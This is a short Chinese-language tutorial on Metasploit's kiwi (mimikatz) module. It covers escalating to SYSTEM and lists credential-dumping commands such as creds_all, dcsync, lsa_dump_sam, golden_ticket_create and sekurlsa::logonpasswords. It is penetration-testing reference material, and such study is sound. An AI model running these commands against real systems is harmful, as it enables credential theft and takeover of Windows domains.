## kiwi模块

使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。

### kiwi模块使用

提权到system权限
进程迁移

```shell
加载kiwi模块
load kiwi

查看kiwi模块的使用
help kiwi

creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码

creds_all
#该命令可以列举系统中的明文密码

kiwi_cmd
kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令
kiwi_cmd sekurlsa::logonpasswords
```

